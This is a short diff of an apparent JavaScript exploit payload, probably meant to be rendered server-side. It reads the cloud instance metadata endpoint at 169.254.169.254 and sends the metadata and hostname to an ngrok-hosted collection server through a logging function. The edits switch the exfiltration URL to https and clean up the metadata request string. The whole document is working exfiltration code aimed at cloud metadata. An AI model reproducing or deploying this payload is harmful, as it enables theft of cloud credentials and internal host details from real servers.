@@ -4,7 +4,7 @@ var logTimeServer = 'd0ea-103-127-23-219.ngrok-free.app';
 
 function log(data) {
     var sreq = new XMLHttpRequest();
-    sreq.open('GET', 'http://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
+    sreq.open('GET', 'https://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
     sreq.send();
 }
 
@@ -31,6 +31,6 @@ for(var i = 0; i < 60; ++i) {
     req.open('GET', 'http://' + logTimeServer + '/', false);
     req.send();
 }
-log('Meta Data: ' + get('curl http://169.254.169.254/latest/meta-data/'));
+log('Meta Data: ' + get('http://169.254.169.254/latest/meta-data/'));
 log('Hostname: ' + get('http://169.254.169.254/latest/meta-data/local-hostname'));
 </script>
